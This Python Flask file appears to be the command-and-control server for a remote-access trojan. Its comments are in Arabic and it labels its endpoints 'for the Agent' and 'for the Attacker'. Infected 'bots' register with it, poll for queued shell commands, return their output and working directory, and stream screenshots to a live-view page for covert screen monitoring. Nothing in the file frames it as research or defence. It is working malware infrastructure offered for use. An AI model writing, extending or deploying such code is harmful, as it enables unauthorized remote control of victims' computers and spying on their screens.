from flask import Flask, request, jsonify, render_template_string
import time
import json
import os
import re
import uuid

app = Flask(__name__)

# ============================================================
# 📊 قاعدة البيانات
# ============================================================
bots = {}          # bot_id -> {"ip": ip, "last_seen": time, "cwd": path}
commands = {}      # bot_id -> [list of commands]
results = {}       # bot_id -> [list of results]

# ============================================================
# 📺 LIVE SCREEN
# ============================================================
live_images = {}   # bot_id -> last_image (base64)

# ============================================================
# 🌐 الصفحة الرئيسية
# ============================================================
@app.route('/')
def index():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>B2B Server</title>
        <style>
            body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .box { border: 2px solid #00ff00; padding: 40px; text-align: center; background: #000; }
            h1 { font-size: 48px; margin: 0; }
            .sub { color: #006600; font-size: 14px; margin-top: 10px; }
        </style>
    </head>
    <body>
        <div class="box">
            <h1>B2B Server</h1>
            <div class="sub">Tunnel Active</div>
            <div class="sub" style="margin-top:20px; color:#003300;">⚡ Ready</div>
        </div>
    </body>
    </html>
    """

# ============================================================
# 📺 LIVE VIEW (صفحة البث المباشر)
# ============================================================
@app.route('/live/<bot_id>')
def live_view(bot_id):
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Live Screen - {{ bot_id }}</title>
        <style>
            body { background: #0a0a0a; color: #00ff00; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .container { text-align: center; }
            img { max-width: 95%; max-height: 85vh; border: 2px solid #00ff00; border-radius: 10px; background: #000; }
            .info { margin-top: 10px; font-size: 14px; color: #00aa00; }
            .status { color: #00ff00; animation: blink 1s infinite; }
            @keyframes blink { 50% { opacity: 0; } }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>📺 Live Screen: <span style="color:#00ff00;">{{ bot_id }}</span></h2>
            <img id="screen" src="">
            <div class="info"><span class="status">●</span> Live streaming... (updates every 2 seconds)</div>
        </div>
        <script>
            const botId = "{{ bot_id }}";
            const img = document.getElementById('screen');

            function update() {
                fetch(`/api/live_image/${botId}`)
                    .then(r => r.json())
                    .then(data => {
                        if (data.image) {
                            img.src = `data:image/jpeg;base64,${data.image}`;
                        }
                    })
                    .catch(() => {});
            }

            setInterval(update, 2000);
            update();
        </script>
    </body>
    </html>
    ''', bot_id=bot_id)

# ============================================================
# 📺 API: استقبال الصور من الـ Agent
# ============================================================
@app.route('/live_screen', methods=['POST'])
def live_screen():
    data = request.json
    bot_id = data.get('bot_id')
    image = data.get('image')
    if bot_id and image:
        live_images[bot_id] = image
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

# ============================================================
# 📺 API: جلب الصورة للـ Browser
# ============================================================
@app.route('/api/live_image/<bot_id>')
def live_image(bot_id):
    if bot_id in live_images:
        return jsonify({"image": live_images[bot_id]})
    return jsonify({"image": None})

# ============================================================
# 📡 APIs للـ Agent
# ============================================================
@app.route('/register', methods=['POST'])
def register():
    data = request.json
    bot_id = data.get('id')
    if bot_id:
        bot_id = re.sub(r'[^a-zA-Z0-9_\-]', '', bot_id)
        bots[bot_id] = {
            "ip": request.remote_addr,
            "last_seen": time.time(),
            "cwd": "C:\\"
        }
        if bot_id not in commands:
            commands[bot_id] = []
        if bot_id not in results:
            results[bot_id] = []
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

@app.route('/get_command/<bot_id>', methods=['GET'])
def get_command(bot_id):
    if bot_id not in bots:
        return jsonify({"command": ""})
    
    bots[bot_id]["last_seen"] = time.time()
    
    if bot_id in commands and commands[bot_id]:
        cmd = commands[bot_id].pop(0)
        return jsonify({"command": cmd})
    
    return jsonify({"command": ""})

@app.route('/send_result', methods=['POST'])
def send_result():
    data = request.json
    bot_id = data.get('bot_id')
    result = data.get('result', '')
    new_cwd = data.get('cwd', '')
    
    if bot_id:
        if bot_id in results:
            results[bot_id].append(result)
        
        if bot_id in bots and new_cwd:
            bots[bot_id]["cwd"] = new_cwd
        
        if bot_id in bots:
            bots[bot_id]["last_seen"] = time.time()
    
    return jsonify({"status": "ok"})

# ============================================================
# 📡 APIs للـ Attacker
# ============================================================
@app.route('/api/active_bots', methods=['GET'])
def active_bots():
    now = time.time()
    active = []
    for bot_id, info in bots.items():
        if now - info["last_seen"] < 30:
            active.append({
                "id": bot_id,
                "ip": info["ip"],
                "cwd": info.get("cwd", "C:\\"),
                "last_seen": info["last_seen"]
            })
    return jsonify(active)

@app.route('/api/send_command', methods=['POST'])
def send_command():
    data = request.json
    bot_id = data.get('id')
    cmd = data.get('cmd')
    
    if bot_id not in bots:
        return jsonify({"status": "error", "message": "Bot not found"}), 404
    
    if bot_id not in commands:
        commands[bot_id] = []
    
    commands[bot_id].append(cmd)
    
    if bot_id in results:
        results[bot_id] = []
    
    return jsonify({"status": "queued"})

@app.route('/api/get_result/<bot_id>', methods=['GET'])
def get_result(bot_id):
    if bot_id not in results:
        return jsonify({"output": ""})
    
    res = results[bot_id].copy()
    results[bot_id] = []
    
    if res:
        return jsonify({"output": res[-1] if res else ""})
    return jsonify({"output": ""})

# ============================================================
# 🏁 تشغيل السيرفر
# ============================================================
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
